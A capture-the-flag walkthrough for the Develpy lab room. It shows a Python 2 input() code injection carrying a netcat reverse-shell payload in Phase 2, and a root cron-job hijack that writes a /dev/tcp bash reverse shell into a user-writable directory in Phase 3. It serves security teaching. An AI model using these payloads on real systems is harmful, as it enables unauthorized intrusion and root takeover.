# Develpy CTF — Full Walkthrough

**Room:** Develpy | **Difficulty:** Easy | **Flags:** 2

| Detail | Value |
|--------|-------|
| Target IP | `10.49.166.224` |
| Attack IP | `192.168.192.149` |
| OS | Linux |

---

## Flags Overview

| # | Method |
|---|--------|
| 01 | Python 2 `input()` injection |
| 02 | Cron job hijack via writable directory |

---

## Phase 1: Reconnaissance

```bash
nmap -sC -sV 10.49.166.224 -oN nmap_scan.txt
```

**Results:**

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 7.2p2 Ubuntu |
| 10000/tcp | Python 2 service (vulnerable `input()`) |

---

## Phase 2: Initial Access — Python `input()` Injection

The service on port 10000 runs a Python 2 script that uses `input()`, which evaluates user input as Python code.

### Verification

```bash
nc 10.49.166.224 10000
# Enter: 1+1
# Output: 2  (confirms code execution)
```

### Exploit — Reverse Shell Payload

```python
__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.192.149 4444 >/tmp/f')
```

1. Start listener: `nc -lvnp 4444`
2. Send payload to port 10000
3. **Shell obtained as user `king`**
4. Read flag: `cat /home/king/user.txt`

---

## Phase 3: Privilege Escalation — Cron Job Hijack

### Enumeration

Checked `/etc/crontab`:

```
* * * * * root cd /home/king/ && bash root.sh
```

The script `root.sh` runs as root every minute. While the file is owned by root, the directory `/home/king/` is owned by `king`.

### Exploitation

```bash
# Remove the original script
rm /home/king/root.sh

# Create malicious reverse shell
echo '#!/bin/bash
bash -c "bash -i >& /dev/tcp/192.168.192.149/4446 0>&1"' > /home/king/root.sh

# Make executable
chmod +x /home/king/root.sh
```

1. Start listener: `nc -lvnp 4446`
2. Wait for cron job to execute (≤ 1 minute)
3. **Root shell obtained**
4. Read flag: `cat /root/root.txt`

---

## Vulnerability Chain

1. **Insecure Python 2 `input()`** — Equivalent to `eval(raw_input())`, allows arbitrary code execution
2. **Directory permission misconfiguration** — User-owned directory allows deleting/replacing root-owned files
3. **Insecure cron job** — Root runs a script from a user-writable directory

## Key Takeaways

- **Never use `input()` in Python 2** — use `raw_input()` instead
- **Directory ownership matters** — owning a directory lets you replace any file inside it
- **Always check crontabs** — scripts running as root from user-writable dirs are prime targets
